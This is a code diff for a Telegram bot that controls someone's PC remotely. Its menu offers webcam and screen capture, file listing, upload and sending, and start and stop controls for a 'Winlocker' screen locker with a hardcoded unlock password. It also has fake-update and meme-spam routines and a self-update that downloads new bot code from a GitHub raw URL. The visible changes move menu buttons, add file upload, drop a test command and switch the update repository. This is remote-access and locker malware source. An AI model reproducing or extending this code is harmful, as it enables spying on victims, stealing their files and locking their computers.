@@ -154,8 +154,8 @@ def main_menu():
     markup.add("📹 Вебкамера 8 сек", "🚀 Поддержать автора")
     markup.add("▶️ Запустить Winlocker🔐", "⏹ Остановить WINLOCKER🔐")
     markup.add("📁 Список файлов", "📤 Отправить файл")
-    markup.add("🎥 Скринкаст 10 сек", "⏩ Обновить бота")
-    markup.add("🛑 Остановить бота", "🔄 Перезапуск бота")
+    markup.add("📥 Загрузить файл", "🎥 Скринкаст 10 сек")
+    markup.add("⏩ Обновить бота", "🛑 Остановить бота")
     return markup
 
 # --- Локальные функции (пример: black screen, fake update, meme spam) ---
@@ -224,11 +224,6 @@ def local_fake_update(duration=8, update_interval=0.5):
         root.mainloop()
 
     threading.Thread(target=_run, daemon=True).start()
-
-# Тестовая функция для проверки обновлений
-def test_update():
-    print("✅ Тестовая функция test_update вызвана!")
-    return "Тестовая функция обновлений работает корректно!"
 
 def local_meme_spam(folder=MEME_DIR, count=5, show_time=1.2):
     if not os.path.isdir(folder):
@@ -502,15 +497,6 @@ def start(message):
 
 PASSWORD = "5090"  # Set your unlock password here
 
-@bot.message_handler(commands=["testupdate"])
-def handle_test_update(message):
-    if message.chat.id != ADMIN_ID:
-        bot.send_message(message.chat.id, "⛔ У вас нет прав для выполнения этой команды.")
-        return
-
-    result = test_update()
-    bot.send_message(message.chat.id, result)
-
 @bot.message_handler(func=lambda message: True)
 def handle_buttons(message):
     global script_thread, script_stop_event  # <-- Add this line
@@ -572,7 +558,7 @@ def handle_buttons(message):
 
         try:
             # URL репозитория с обновлением
-            repo_url = "https://raw.githubusercontent.com/RBXLU/Telegram-Pc-Control-Bot/main/bot.py"
+            repo_url = "https://raw.githubusercontent.com/RBXLU/pccontrol/main/bot.py"
             response = requests.get(repo_url)
 
             if response.status_code == 200:
